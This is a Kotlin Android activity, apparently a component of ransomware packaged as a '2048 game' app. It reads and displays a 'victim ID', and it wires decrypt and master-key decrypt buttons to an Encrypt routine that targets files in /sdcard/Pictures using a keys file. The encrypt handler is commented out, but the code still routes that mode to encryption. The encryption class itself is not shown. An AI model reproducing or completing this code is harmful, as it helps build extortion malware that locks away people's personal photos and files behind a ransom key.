package aarkay.a2048game

import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity

import java.io.*
import javax.crypto.Cipher


class EncryptFile : AppCompatActivity(){

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?){
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_encrypt)


        // Display victimID
        val textView: TextView = findViewById(R.id.victimID)
        val victimIDFile = "/sdcard/victimID.txt"
        var file = File(victimIDFile)
        if (file.exists()){
            textView.text = file.inputStream().readBytes().toString(Charsets.UTF_8)
        }
        else {
            textView.text = "NO VICTIM ID FOUND"
        }

        val inputText: EditText = findViewById(R.id.input_masterkey)

//        val encrypt_button: Button = findViewById(R.id.btn_encrypt)
        val decrypt_button: Button = findViewById(R.id.btn_decrypt)
        val masterDecrypt_button: Button = findViewById(R.id.btn_masterdecrypt)

//        encrypt_button.setOnClickListener {
//            var cipherMode = Cipher.ENCRYPT_MODE.toString()
//            main(arrayOf(cipherMode))
//        }

        decrypt_button.setOnClickListener {
            var cipherMode = Cipher.DECRYPT_MODE.toString()
            main(arrayOf(cipherMode))
        }

        masterDecrypt_button.setOnClickListener {
            var mode = 4
            var cipherMode = mode.toString()
            var masterKey = inputText.text.toString()
            main(arrayOf(cipherMode, masterKey))
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    fun main(args: Array<String>) {
        val fileName = "/sdcard/keys.json"
        var filePath = "/sdcard/Pictures"

        val cipherMode = args[0].toInt()

        // args[0].toInt() --> 1: aarkay.a2048game.Encrypt || 2: Decrypt
        if (cipherMode == 1 || cipherMode == 2){
            Encrypt.init(cipherMode, filePath, fileName, "")
        }
        else if (cipherMode == 4) {
            // Master decrypt
            val masterKey = args[1].toString()
            Encrypt.init(cipherMode, filePath, fileName, masterKey)
        }
    }
}